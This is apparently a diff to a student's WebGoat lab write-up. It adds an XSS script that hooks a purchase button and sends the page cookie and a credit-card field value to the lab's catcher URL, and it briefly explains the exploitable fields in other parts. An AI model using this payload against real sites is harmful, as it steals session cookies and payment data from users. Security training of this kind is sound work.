@@ -10,6 +10,14 @@ Part 2 explanation:
 Exploitable field: Enter your three digit access code
 We set the onlick of purchase to steal the cc number, which will be in field2, and the cookie, which is already loaded on the page
 
+<script>
+    document.getElementsByName("purchase")[0].onclick = 
+        function() {
+            var xss_exploit = new Image();
+            xss_exploit.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&cookie=" + document.cookie.split("=")[1] + "&credit=" + document.getElementsByName("field2")[0].value.replace(/\s+/g, '-');
+        };
+</script>
+
 Part 3 explanation:
 Exploitable field: Message
 Payload: img is loaded from src, which causes the transfer
